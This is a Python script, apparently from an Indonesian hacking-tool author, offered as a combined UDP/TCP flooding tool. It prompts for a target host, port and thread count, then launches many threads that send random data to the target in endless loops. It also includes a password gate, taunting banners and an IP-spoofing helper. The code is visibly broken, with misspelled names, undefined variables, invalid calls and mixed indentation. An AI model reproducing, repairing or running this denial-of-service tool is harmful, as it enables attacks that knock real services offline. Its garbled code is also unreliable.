#Author Coding Eclipse
#Remake Udp + Tcp Di Gabungin
#Kalo Mau Rename/Nyolong Pm Sama Ownernya Eclipse
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass
import datetime
import pharse

#Warna Untuk Tools
yellow='\033[93m'
green='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'

def random_phrase():
    ppl = ["EXLIPSE#1334", "CYBER-EXLIPSE", "EXLIPSE#1334", "KING-EXLIPSE", "CODE-EXLIPSE", "AUTHOR-EXLIPSE", "STUDIO-EXLIPSE", "KILLER-EXLIPSE", "EXLIPSE#1334"]
    phrase = ["ada di sini", "melihatmu", "tahu namamu", "tahu lokasimu", "meretas NASA", "mengretas FBI", "meretas kamu", "mencari 4 kamu", "tepat di belakangmu ", "memiliki sensasi"]
    return random.choice(ppl) + " " + random.choice(phrase)

def banner():
    print(f"""\033[93m
     ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄
    █   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐
    ▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄
       █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █
     ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀
    █                           ▀     █    ▐   ▐     ▐       █     ▐            ▐
    ▐                                 ▐                      ▐ {random_phrase()}

    \033[2;33mVersion: V2.3 \t Author Code : EXLIPSE#1334\n\033[0m
    """)

password ="EXLIPSE"

for i in range(4):
	pwd = input(pink+b+"[E] Enter Password Tools [E]: "+b+pink)
	j=3
	if(pwd==password):
		time.sleep(2)
		print(yellow+b+"{E) Check Enter Your Password...."+b+yellow)
		break
	else:
		time.sleep(4)
		print(red+b+"{E} Password Yang Kamu Masukan Salah!!! "+b+red)
		continue
time.sleep(3)
print(green+b+"{E} Password Yang Kamu Masukan Benar!!!! \033[92m[√]\033[0m "+b+green)
time.sleep(2)
os.system("clear")


def banner():
    print(f"""\033[93m
     ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄
    █   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐
    ▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄
       █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █
     ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀
    █                           ▀     █    ▐   ▐     ▐       █     ▐            ▐
    ▐                                 ▐                      ▐ {random_phrase()}

    \033[2;33mVersion: V2.3 \t Author Code : EXLIPSE#1334\n\033[0m
    """)

print(yellow+b+"{E} ===================================")
print(yellow+b+"{E} Author Code : Eclipse ") 
print(yellow+b+"{E}Dont Abuse And Dont Rename ") 
print(yelloe+b+"{E}Welcome My Tools")
print(yellow+b"{E} Thanks For Use My Tools Eclipse              ")
print(uellow+b+"{E} ===================================")
ip = str(input("  \033[0;31m[ Enter Target Host ]:"))
port = int(input(" \033[0;32m[ Enter Target Port ]:"))
choice = str(input(" \033[94m[ Enter Methods UDP-TCP ]: "))
times = int(input(" \033[0;31m[ Enter Attack Packet ]:"))
threads = int(input(" \033[0;32m[ Enter Attack Threads ]:"))
def Attack():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, bytes, addr)
			print(+"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
			
def Attack2():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, bytes, addr)
			print(+"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
			
def Attack3():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, bytes, addr)
			print(+"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
			
def Attack4():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, bytes, addr)
			print(+"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
			
def Attack5():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, bytes, addr)
			print(+"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))

def Attack6():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, bytes, addr)
			print(+"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))

def Attack7():
    bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, bytes, addr)
			print(pink+b+"Sent Attack Host And Port %s \033[91m %s"+b+pink%(ip,port))
		except:
			print(pink+b+"Sent Attack Host And Port %s \033[91m %s"+b+pink%(ip,port))

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

for y in range(threads):
	if choice == 'UDP-TCP':
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
else:
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack6)
		th.start()
		th = threading.Thread(target = Attack7)